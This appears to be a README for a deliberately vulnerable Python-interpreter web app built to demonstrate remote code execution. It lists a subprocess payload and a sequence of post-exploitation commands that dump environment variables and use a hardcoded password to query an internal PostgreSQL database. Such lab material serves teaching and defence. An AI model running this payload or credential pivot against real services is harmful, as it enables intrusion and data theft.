# WebPy

WebPy is a web-based Python interpreter designed to demonstrate and mitigate
Remote Code Execution (RCE) vulnerabilities.

## Install dependencies

```bash
pip install -r requirements.txt
```

## Execute the app

```bash
gunicorn -w 4 -b 0.0.0.0:80 app:app
```

## Payload

```python
import subprocess
result = subprocess.run('whoami', shell=True, capture_output=True, text=True)
print(result.stdout)
print(result.stderr)
```

## List of shell commands to execute

```bash
env
apt install postgresql-client -y
export PGPASSWORD=p@ssword123
PGPASSWORD=p@ssword123 psql -U admin -h 10.105.253.110 -p 5432 -d postgres -c "\l"
PGPASSWORD=p@ssword123 psql -U admin -h 10.105.253.110 -p 5432 -d postgres -d webpydb -c "\dt"
PGPASSWORD=p@ssword123 psql -U admin -h 10.105.253.110 -p 5432 -d postgres -d webpydb -c "SELECT * FROM executions;"
```

## References

https://kubernetes.io/docs/concepts/services-networking/service/#environment-variables